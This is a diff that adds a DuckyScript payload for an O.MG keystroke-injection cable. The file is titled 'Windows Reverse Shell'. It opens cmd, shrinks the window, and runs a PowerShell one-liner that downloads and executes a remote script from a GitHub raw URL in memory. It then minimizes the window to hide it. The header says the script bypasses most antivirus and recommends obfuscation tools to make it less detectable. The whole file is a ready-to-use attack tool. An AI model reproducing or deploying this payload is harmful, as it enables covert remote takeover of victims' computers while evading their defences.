@@ -1,0 +1,26 @@
+REM ############################################################################################################# 
+REM # Title: Windows Reverse Shell                                                                              #
+REM # Description: This script is designed to get a reverse shell in Windows enviroments                        #
+REM # with a one liner powershell command, this bypasses almost all antivirus out there and executes in memory. #
+REM # To use it, just clone the reverse shell, change the IP, load it into the OMG cable and wait for nc.       #
+REM # You can even ofuscate the powershell with Invoke-Obfuscation and pyfuscation to make it even more         #
+REM # undetectable.                                                                                             #
+REM # Author: Hug1n                                                                                             #
+REM ############################################################################################################# 
+
+REM @@ Opening the CMD
+GUI r 
+DELAY 500
+STRING cmd.exe
+ENTER 
+DELAY 200
+REM @@ Changing the color, risizing the CMD and executing the reverse shell in memory
+STRING cmd /C color FE&mode con:cols=18 lines=1&powershell "iex(iwr raw.githubusercontent.com/Hug1n/reverse_shells/main/minrev.ps1)"
+DELAY 200
+ENTER
+REM @@ Minimizing the CMD
+ALT SPACE
+DOWN
+DOWN
+DOWN
+ENTER
